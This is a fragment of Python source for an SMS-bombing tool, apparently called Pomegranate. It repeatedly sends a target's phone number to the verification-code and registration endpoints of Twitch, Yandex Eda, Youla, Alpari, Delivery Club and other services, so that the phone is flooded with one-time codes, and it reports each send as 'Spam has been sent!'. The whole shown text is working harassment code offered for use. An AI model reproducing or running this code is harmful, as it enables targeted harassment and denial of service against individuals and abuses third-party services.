					requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')
				try:
					requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
					print(Fore.GREEN + '''[+] Spam has been sent!''')
				except:
					from termcolor import colored
					print(Fore.RED + '''[-] Failed to send!''')

				iteration += 1
				print(('{} Circle passed.').format(iteration))
			except:
				pass
spammer = Pomegranate()
spammer.main()
